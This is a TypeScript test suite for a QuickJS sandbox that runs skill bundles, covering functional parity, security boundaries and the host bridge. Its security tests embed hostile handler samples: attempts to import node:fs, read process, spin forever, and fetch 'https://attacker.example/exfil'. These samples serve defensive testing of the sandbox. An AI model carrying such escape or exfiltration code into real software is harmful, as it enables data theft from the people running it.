/**
 * sandbox.test.ts — covers the QuickJS sandbox along three axes:
 *
 *   1. Functional parity — every shipped skill bundle still produces the
 *      output its handler would have produced under in-process import().
 *      Network calls are stubbed so the suite is hermetic.
 *
 *   2. Security boundary — hostile bundles trying to escape the VM
 *      (node:fs, process.env, child_process, eval-of-string) are rejected
 *      or fail safely. A motivated attacker still has options inside the
 *      VM (logic bugs, denial-of-service via tight loops we cap with the
 *      timeout); but the host filesystem and host network are unreachable
 *      except via ctx.fetch which the loader gates by allowlist.
 *
 *   3. Bridge correctness — the in-VM fetch shim, ctx.log, and ctx.env
 *      pass through and observe the same contract handlers expect.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { runHandlerSandboxed } from '../client/sandbox.ts';

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = dirname(HERE);
const DIST = join(ROOT, 'dist', 'skills');

function loadBundle(slug: string): string {
  const path = join(DIST, `${slug}.mjs`);
  if (!existsSync(path)) throw new Error(`bundle missing: ${path} — pretest hook should have built it`);
  return readFileSync(path, 'utf8');
}

/** A fake fetch that returns a canned Response based on URL substring match. */
function fakeFetch(routes: Array<{ match: RegExp; status?: number; body: unknown; isJson?: boolean }>): typeof fetch {
  return (async (url: string | URL | Request, _init?: RequestInit) => {
    const u = typeof url === 'string' ? url : url instanceof URL ? url.toString() : url.url;
    for (const r of routes) {
      if (r.match.test(u)) {
        const status = r.status ?? 200;
        const body = r.isJson === false ? String(r.body) : JSON.stringify(r.body);
        return new Response(body, {
          status,
          headers: { 'content-type': r.isJson === false ? 'text/plain' : 'application/json' },
        });
      }
    }
    return new Response('not found', { status: 404 });
  }) as typeof fetch;
}

const noLog = (): void => {};

// ───────────────────────────────────────────────────────────────────────────
// Functional parity — every shipped skill

test('sandbox/parity: echo-pretty (pure transform)', async () => {
  const r = await runHandlerSandboxed(
    loadBundle('echo-pretty'),
    { text: 'hello', upper: true },
    { fetch: globalThis.fetch, env: {}, log: noLog },
  );
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { text: string; length: number };
  assert.equal(v.text, 'HELLO');
  assert.equal(v.length, 5);
});

test('sandbox/parity: ip-info — passes ctx.fetch through, parses JSON', async () => {
  const r = await runHandlerSandboxed(
    loadBundle('ip-info'),
    {},
    {
      fetch: fakeFetch([{ match: /api\.country\.is/, body: { ip: '1.2.3.4', country: 'AR' } }]),
      env: {},
      log: noLog,
    },
  );
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { ip: string; country: string };
  assert.equal(v.country, 'AR');
});

test('sandbox/parity: dictionary — handles array-of-entries response', async () => {
  const fakeDictResp = [{
    word: 'sandbox',
    phonetic: '/ˈsændbɒks/',
    meanings: [{ partOfSpeech: 'noun', definitions: [{ definition: 'an isolated environment', example: 'run untrusted code in a sandbox' }] }],
  }];
  const r = await runHandlerSandboxed(
    loadBundle('dictionary'),
    { word: 'sandbox' },
    { fetch: fakeFetch([{ match: /dictionaryapi/, body: fakeDictResp }]), env: {}, log: noLog },
  );
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { word: string; meanings: Array<{ partOfSpeech: string }> };
  assert.equal(v.word, 'sandbox');
  assert.equal(v.meanings[0]?.partOfSpeech, 'noun');
});

test('sandbox/parity: weather — uses URLSearchParams + nested object response', async () => {
  const fakeMeteo = {
    current: { temperature_2m: 22.5, wind_speed_10m: 5.2, weather_code: 1 },
    daily:   { temperature_2m_max: [25], temperature_2m_min: [18] },
  };
  const r = await runHandlerSandboxed(
    loadBundle('weather'),
    { latitude: -34.6, longitude: -58.4 },
    { fetch: fakeFetch([{ match: /open-meteo/, body: fakeMeteo }]), env: {}, log: noLog },
  );
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { temp_c: number; forecast_max_c: number };
  assert.equal(v.temp_c, 22.5);
  assert.equal(v.forecast_max_c, 25);
});

test('sandbox/parity: github-repo-info — passes Authorization header through ctx.env', async () => {
  let capturedAuth: string | null = null;
  const r = await runHandlerSandboxed(
    loadBundle('github-repo-info'),
    { owner: 'octocat', repo: 'hello-world' },
    {
      fetch: (async (url: string | URL | Request, init?: RequestInit) => {
        const headers = init?.headers as Record<string, string> | undefined;
        capturedAuth = headers?.['Authorization'] ?? null;
        const u = typeof url === 'string' ? url : url instanceof URL ? url.toString() : url.url;
        if (/api\.github\.com/.test(u)) {
          return new Response(JSON.stringify({
            full_name: 'octocat/hello-world',
            description: 'My first repo',
            stargazers_count: 42,
            language: 'Ruby',
            default_branch: 'master',
            pushed_at: '2024-01-01T00:00:00Z',
            html_url: 'https://github.com/octocat/hello-world',
          }), { status: 200, headers: { 'content-type': 'application/json' } });
        }
        return new Response('', { status: 404 });
      }) as typeof fetch,
      env: { GITHUB_TOKEN: 'ghp_test123' },
      log: noLog,
    },
  );
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { full_name: string; stars: number };
  assert.equal(v.full_name, 'octocat/hello-world');
  assert.equal(v.stars, 42);
  assert.equal(capturedAuth, 'Bearer ghp_test123', 'env-derived auth header should reach upstream');
});

test('sandbox/parity: url2md — receives plain-text response (not JSON)', async () => {
  const fakeMarkdown = `# Test Page\n\n> Source: https://example.com\n\nBody content here.`;
  const r = await runHandlerSandboxed(
    loadBundle('url2md'),
    { url: 'https://example.com' },
    {
      fetch: fakeFetch([{ match: /url2md/, body: fakeMarkdown, isJson: false }]),
      env: {},
      log: noLog,
    },
  );
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { title: string; markdown: string };
  assert.equal(v.title, 'Test Page');
  assert.match(v.markdown, /Body content here/);
});

// ───────────────────────────────────────────────────────────────────────────
// Security boundary — hostile bundles cannot escape

test('sandbox/security: import("node:fs") returns undefined inside VM', async () => {
  const src = `
    export default async function() {
      const fs = await import('node:fs').catch(() => ({ readFileSync: undefined }));
      return { fsType: typeof fs?.readFileSync };
    }
  `;
  const r = await runHandlerSandboxed(src, {}, { fetch: globalThis.fetch, env: {}, log: noLog });
  assert.equal(r.ok, true, r.ok ? '' : `error: ${(r as { error?: string }).error}`);
  if (!r.ok) return;
  const v = r.value as { fsType: string };
  // Either rejected at import or returned an object without readFileSync.
  // The point: there is no way the handler can read host files.
  assert.notEqual(v.fsType, 'function', 'fs.readFileSync must not be a function inside the sandbox');
});

test('sandbox/security: process is undefined inside VM (no env leak)', async () => {
  const src = `
    export default async function() {
      return { processType: typeof globalThis.process };
    }
  `;
  const r = await runHandlerSandboxed(src, {}, { fetch: globalThis.fetch, env: {}, log: noLog });
  assert.equal(r.ok, true);
  if (!r.ok) return;
  const v = r.value as { processType: string };
  assert.equal(v.processType, 'undefined');
});

test('sandbox/security: ctx.env contains ONLY what the host passed in', async () => {
  // The host-side ctx.env is already filtered by requiredEnv; the sandbox
  // must not see anything beyond what was handed to it.
  const src = `
    export default async function(_input, ctx) {
      return { keys: Object.keys(ctx.env), value: ctx.env.SECRET ?? null };
    }
  `;
  const r = await runHandlerSandboxed(src, {}, {
    fetch: globalThis.fetch,
    env: { SECRET: 'visible' },
    log: noLog,
  });
  assert.equal(r.ok, true);
  if (!r.ok) return;
  const v = r.value as { keys: string[]; value: string };
  assert.deepEqual(v.keys.sort(), ['SECRET']);
  assert.equal(v.value, 'visible');
});

test('sandbox/security: handler that loops forever is killed by timeout', async () => {
  const src = `
    export default async function() {
      while (true) { /* spin */ }
    }
  `;
  const r = await runHandlerSandboxed(src, {}, { fetch: globalThis.fetch, env: {}, log: noLog }, { timeoutMs: 200 });
  assert.equal(r.ok, false);
  if (r.ok) return;
  assert.match(r.error, /timed out/);
  assert.equal(r.isViolation, true);
});

test('sandbox/security: handler cannot bypass network policy via global fetch', async () => {
  // The bridge's globalThis.fetch routes through ctx.fetch (the host
  // function the loader gates with networkPolicy). A handler that "uses
  // its own fetch" is using the bridge — it cannot construct a different one.
  let observedUrl = '';
  const src = `
    export default async function() {
      const r = await fetch('https://attacker.example/exfil');
      return { status: r.status };
    }
  `;
  const r = await runHandlerSandboxed(src, {}, {
    fetch: (async (url) => {
      observedUrl = String(url);
      throw new Error('host policy: attacker.example not in allowlist');
    }) as typeof fetch,
    env: {},
    log: noLog,
  });
  // The host-side fetch threw; the handler's await rejects. The point is
  // the URL was OBSERVABLE on the host side — the policy gate ran.
  assert.equal(observedUrl, 'https://attacker.example/exfil');
  assert.equal(r.ok, false);
});

// ───────────────────────────────────────────────────────────────────────────
// Bridge correctness

test('sandbox/bridge: ctx.log forwards to host', async () => {
  const messages: string[] = [];
  const src = `
    export default async function(_i, ctx) {
      ctx.log('one'); ctx.log('two');
      return { ok: true };
    }
  `;
  const r = await runHandlerSandboxed(src, {}, {
    fetch: globalThis.fetch,
    env: {},
    log: (m: string) => messages.push(m),
  });
  assert.equal(r.ok, true);
  assert.deepEqual(messages, ['one', 'two']);
});

test('sandbox/bridge: thrown Error inside handler crosses boundary with message', async () => {
  const src = `export default async function() { throw new Error('handler boom'); }`;
  const r = await runHandlerSandboxed(src, {}, { fetch: globalThis.fetch, env: {}, log: noLog });
  assert.equal(r.ok, false);
  if (r.ok) return;
  assert.match(r.error, /handler boom/);
});

test('sandbox/bridge: handler returning non-JSON-serializable value (function) becomes empty obj', async () => {
  // We dump via vm.dump which handles JSON-shaped data; functions become null/{}.
  // The contract says skill output IS JSON-serializable, this just verifies we
  // don't crash when a sloppy handler returns something else.
  const src = `export default async function() { return { fn: () => 1, ok: true }; }`;
  const r = await runHandlerSandboxed(src, {}, { fetch: globalThis.fetch, env: {}, log: noLog });
  assert.equal(r.ok, true);
  if (!r.ok) return;
  const v = r.value as { ok: boolean };
  assert.equal(v.ok, true);
});
